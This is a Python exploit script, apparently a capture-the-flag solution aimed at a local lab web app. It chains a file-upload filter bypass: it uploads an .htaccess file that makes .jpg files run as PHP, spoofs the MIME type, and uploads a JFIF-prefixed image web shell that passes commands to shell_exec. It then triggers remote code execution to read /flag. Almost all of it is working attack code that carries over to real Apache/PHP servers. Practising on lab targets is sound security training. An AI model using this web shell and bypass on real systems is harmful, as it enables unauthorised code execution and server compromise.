#!/usr/bin/env python3
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))
# 40-combo-upload-bypass
# 利用链: 黑名单不全(.htaccess漏网) + MIME仅看Content-Type + Apache AllowOverride + mod_php
# 步骤: 传 .htaccess (让 .jpg 当 PHP 解析) -> 传带 PHP 代码的图片马 -> 访问触发 RCE -> 读 /flag
import sys
import requests

os.environ["NO_PROXY"] = "*"  # 防止代理污染：脚本只访问 127.0.0.1

TARGET = os.environ.get("GKD_URL") or (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:34967")

def upload(filename: str, content: bytes, mime: str = "image/jpeg") -> str:
    """以 multipart/form-data 上传，filename 字段由我们指定（伪造 MIME 绕白名单）"""
    files = {"file": (filename, content, mime)}
    r = requests.post(TARGET + "/", files=files, timeout=10)
    return r.text

def main():
    # Step 1: 上传 .htaccess — 扩展名为 .htaccess，黑名单(php/phtml/phar...)不匹配
    #         Content-Type 伪造成 image/jpeg 即可通过 MIME 白名单
    htaccess = b"AddType application/x-httpd-php .jpg\n"
    upload(".htaccess", htaccess)
    print("[+] .htaccess uploaded")

    # Step 2: 上传图片马 shell.jpg
    #         JFIF 头让任何 exif_imagetype() 校验通过；后面跟 PHP 代码
    jfif = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    php = b'<?php echo "FLAG:".shell_exec($_GET["c"]); ?>'
    upload("shell.jpg", jfif + php)
    print("[+] shell.jpg uploaded")

    # Step 3: 触发 RCE — Apache 因 .htaccess 把 .jpg 交给 mod_php
    r = requests.get(TARGET + "/uploads/shell.jpg", params={"c": "cat /flag"}, timeout=10)
    # 响应里前面是 JFIF 二进制，FLAG: 后面就是 flag
    text = r.content.decode("utf-8", errors="ignore")
    idx = text.find("FLAG:")
    flag = text[idx + 5:].strip() if idx >= 0 else text
    print("[*] flag =", flag)

if __name__ == "__main__":
    main()
